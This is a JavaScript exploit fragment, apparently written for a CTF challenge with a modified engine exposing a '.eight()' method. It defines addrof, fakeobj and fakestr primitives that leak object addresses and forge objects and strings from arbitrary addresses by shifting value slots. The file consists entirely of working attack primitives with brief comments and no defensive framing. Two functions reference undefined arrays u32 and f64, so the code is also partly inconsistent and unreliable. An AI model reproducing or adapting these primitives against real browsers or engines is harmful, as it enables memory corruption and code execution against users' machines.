let bits = new ArrayBuffer(1000);
let floatview = new Float64Array(bits);
let bitview = new Uint32Array(bits);

let addrof = function(obj){
    let first = {"int" : 420, "object" : obj};
    first.eight();
    let second = {"val" : first.int, "floattag" : 7};
    second.eight();
    floatview[0] = second.val;
    first.eight();
    second.eight();
    return (bitview[1] * (1 << 16) * (1 << 16)) + bitview[0];
};
let fakeobj = function(thing){
    // javascript does funny truncating when using >>>, use this instead.
    u32[1] = Math.floor(thing / 2**(32));
    u32[0] = thing >>> 0;
    let o1 = {"gg" : 1, "ff" : f64[0]};
    // shift the first value plane
    o1.eight();
    let o = {"hi" : o1.gg, "bye" : -1};
    // shift the second value plane
    // suddenly, value of thing is now tagged with an object!
    o.eight();
    const fakedobj = o.hi;
    // reshift to not corrupt pointers
    o1.eight();
    o.eight();
    return fakedobj;
};

let fakestr = function(thing){
    // javascript does funny truncating when using >>>, use this instead.
    u32[1] = Math.floor(thing / 2**(32));
    u32[0] = thing >>> 0;
    let o1 = {"gg" : 1, "ff" : f64[0]};
    // shift the first value plane
    o1.eight();
    let o = {"hi" : o1.gg, "bye" : -7};
    // shift the second value plane
    // suddenly, value of thing is now tagged with a str!
    o.eight();
    let fakedstr = o.hi;
    // reshift to not corrupt pointers
    o1.eight();
    o.eight();
    return fakedstr;
};
